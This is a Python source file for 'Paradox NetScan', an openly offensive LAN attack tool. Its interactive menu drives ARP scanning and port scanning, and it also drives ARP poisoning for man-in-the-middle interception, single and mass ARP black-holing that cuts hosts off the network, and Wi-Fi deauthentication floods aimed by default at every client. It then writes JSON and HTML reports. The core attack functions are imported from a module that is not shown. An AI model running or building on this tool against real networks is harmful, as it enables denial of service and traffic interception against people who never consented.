#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Paradox NetScan v3.0 — Apex Offensive Engine
Discovery, deep scan, MITM, floods, reporting.
"""

from __future__ import annotations

import os
import sys
import time
import json
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from paradox.core import (
    console, require_root, get_default_iface, get_local_ip, get_local_cidr,
    collect_network_info, print_network_info, arp_scan, print_hosts,
    select_host, scan_ports, arp_poison, arp_blackhole, mass_arp_blackhole,
    deauth_flood, setup_monitor_mode, Host, NetworkInfo, confirm, safe_int,
    VERSION, COMMON_PORTS,
)
from rich.prompt import Prompt
from rich.table import Table
from rich import box

BANNER = rf"""
[bold red]
 ██████╗  █████╗ ██████╗  █████╗ ██████╗   ██████╗ ███████╗
 ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗ ██╔═══██╗██╔════╝
 ██████╔╝███████║██████╔╝███████║██║  ██║ ██║   ██║███████╗
 ██╔═══╝ ██╔══██║██╔══██╗██╔══██║██║  ██║ ██║   ██║╚════██║
 ██║     ██║  ██║██║  ██║██║  ██║██████╔╝ ╚██████╔╝███████║
 ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝   ╚═════╝ ╚══════╝
[/bold red]
[bold yellow] PARADOX NETSCAN v{VERSION}  |  Apex Offensive Engine[/bold yellow]
[dim] discovery · deep scan · MITM · floods · report[/dim]
"""

MENU = """
[bold red]PARADOX NETSCAN[/bold red]

[bold yellow]RECON[/bold yellow]
  1  Full discovery (ARP + port scan)
  2  Deep port scan selected host
  3  Show hosts / refresh

[bold yellow]MITM / KICK[/bold yellow]
  4  ARP MITM
  5  ARP Black Hole (single)
  6  Mass Black Hole
  7  Deauth (monitor mode)

[bold yellow]REPORT[/bold yellow]
  8  JSON report
  9  HTML report

  0  Exit
"""


def report_json(hosts: list[Host], path: str = "/tmp/paradox_report.json") -> None:
    data = {
        "tool": "Paradox NetScan",
        "version": VERSION,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "host_count": len(hosts),
        "hosts": [
            {
                "ip": h.ip,
                "mac": h.mac,
                "vendor": h.vendor,
                "hostname": h.hostname,
                "os_guess": h.os_guess,
                "risk_score": h.risk_score,
                "open_ports": {str(k): v[:100] for k, v in h.open_ports.items()},
                "findings": h.findings,
            }
            for h in sorted(hosts, key=lambda x: x.risk_score, reverse=True)
        ],
    }
    Path(path).write_text(json.dumps(data, indent=2))
    console.print(f"[green][+] JSON → {path}[/green]")


def report_html(hosts: list[Host], path: str = "/tmp/paradox_report.html") -> None:
    rows = ""
    for h in sorted(hosts, key=lambda x: x.risk_score, reverse=True):
        ports = ", ".join(str(p) for p in sorted(h.open_ports)) or "none"
        findings = "".join(
            f"<li>[{f['severity']}] {f['description']}</li>" for f in h.findings
        )
        rows += (
            f"<tr><td>{h.ip}</td><td>{h.hostname}</td><td>{h.os_guess}</td>"
            f"<td>{ports}</td><td>{h.risk_score}</td><td><ul>{findings}</ul></td></tr>"
        )
    html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Paradox NetScan {VERSION}</title>
<style>
body{{background:#0d0d0d;color:#e0e0e0;font-family:monospace;padding:20px}}
h1{{color:#ff3030}} table{{border-collapse:collapse;width:100%}}
th{{background:#1a1a1a;color:#ff7a00;padding:8px;text-align:left}}
td{{padding:6px;border-bottom:1px solid #2a2a2a;vertical-align:top}}
</style></head><body>
<h1>Paradox NetScan v{VERSION}</h1>
<p>{time.strftime("%Y-%m-%d %H:%M UTC", time.gmtime())}</p>
<table><thead><tr>
<th>IP</th><th>Hostname</th><th>OS</th><th>Ports</th><th>Risk</th><th>Findings</th>
</tr></thead><tbody>{rows}</tbody></table>
</body></html>"""
    Path(path).write_text(html)
    console.print(f"[green][+] HTML → {path}[/green]")


def main() -> None:
    require_root()
    console.print(BANNER)

    iface = get_default_iface()
    iface = Prompt.ask("Interface", default=iface).strip() or iface
    local_ip = get_local_ip(iface)
    console.print(f"[dim]iface={iface}  local={local_ip}[/dim]")

    net = collect_network_info(iface)
    print_network_info(net)

    hosts: list[Host] = []

    if confirm("Run initial ARP scan?", "y"):
        cidr = Prompt.ask("CIDR", default=net.subnet_cidr or get_local_cidr(iface))
        hosts = arp_scan(cidr, iface)
        hosts = [h for h in hosts if h.ip != local_ip]
        if hosts:
            console.print("[yellow][*] Quick port scan on all hosts...[/yellow]")
            for h in hosts:
                scan_ports(h)
            print_hosts(hosts)

    while True:
        console.print(MENU)
        choice = Prompt.ask("[bold cyan]paradox>[/bold cyan]", default="0").strip()

        if choice == "1":
            cidr = Prompt.ask("CIDR", default=net.subnet_cidr or get_local_cidr(iface))
            hosts = arp_scan(cidr, iface)
            hosts = [h for h in hosts if h.ip != local_ip]
            for h in hosts:
                scan_ports(h)
            print_hosts(hosts)

        elif choice == "2":
            h = select_host(hosts)
            if h:
                scan_ports(h, list(range(1, 1025)))
                print_hosts([h])

        elif choice == "3":
            print_hosts(hosts)

        elif choice == "4":
            h = select_host(hosts)
            if h:
                gw = net.gateway_ip or Prompt.ask("Gateway IP")
                arp_poison(h.ip, gw, iface)

        elif choice == "5":
            h = select_host(hosts)
            if h:
                gw = net.gateway_ip or Prompt.ask("Gateway IP")
                dur = safe_int(Prompt.ask("Duration (0=forever)", default="0"))
                arp_blackhole(h.ip, gw, iface, dur)

        elif choice == "6":
            if not hosts:
                console.print("[yellow]Discover first.[/yellow]")
            else:
                gw = net.gateway_ip or Prompt.ask("Gateway IP")
                if confirm(f"Black-hole {len(hosts)} hosts?"):
                    mass_arp_blackhole(hosts, gw, iface)

        elif choice == "7":
            bssid = Prompt.ask("AP BSSID", default=net.bssid if net.bssid != "unknown" else "")
            client = Prompt.ask("Client MAC", default="ff:ff:ff:ff:ff:ff")
            mon = setup_monitor_mode(iface) or iface
            deauth_flood(mon, bssid, client)

        elif choice == "8":
            path = Prompt.ask("Path", default="/tmp/paradox_report.json")
            report_json(hosts, path)

        elif choice == "9":
            path = Prompt.ask("Path", default="/tmp/paradox_report.html")
            report_html(hosts, path)

        elif choice == "0":
            console.print("[bold red]paradox offline.[/bold red]")
            break
        else:
            console.print("[dim]unknown[/dim]")


if __name__ == "__main__":
    main()
